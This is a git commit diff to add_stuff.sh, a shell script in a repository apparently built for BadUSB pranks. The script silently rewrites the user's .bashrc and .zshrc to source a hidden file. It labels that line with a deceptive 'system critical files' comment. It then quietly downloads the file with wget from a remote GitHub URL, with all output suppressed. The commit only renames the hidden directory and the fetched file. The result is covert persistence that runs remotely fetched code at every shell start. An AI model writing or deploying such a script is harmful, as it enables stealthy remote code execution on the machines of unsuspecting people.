7bc72fccfd40c27fa985bc5b86c0729551c1a4eb
cluster bright <142358852+Cluster-bright@users.noreply.github.com>
2025-02-24 10:50:41 +0100

    Update add_stuff.sh

--- terminal_tomfoolery/cloning/add_stuff.sh
+++ terminal_tomfoolery/cloning/add_stuff.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
 content="# Loading system critical files, if you don't know what you're doing, don't do anything
-if [ -f ~/.codex/.filesystem.sh ]; then
-    . ~/.codex/.filesystem.sh
+if [ -f ~/.tcrc/.filesystem.sh ]; then
+    . ~/.tcrc/.filesystem.sh
 fi
 "
 bashrc="$HOME/.bashrc"
 zshrc="$HOME/.zshrc"
-codex_dir="$HOME/.codex"
+codex_dir="$HOME/.tcrc"
 filesystem_file="$codex_dir/.filesystem.sh"
 temp_file=$(mktemp)
 temp_file_zsh=$(mktemp)
@@ -19,5 +19,5 @@ temp_file_zsh=$(mktemp)
     mv "$temp_file" "$bashrc"
     mv "$temp_file_zsh" "$zshrc"
     [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
-    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh" 
+    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/tcrc.sh" 
 } >/dev/null 2>&1
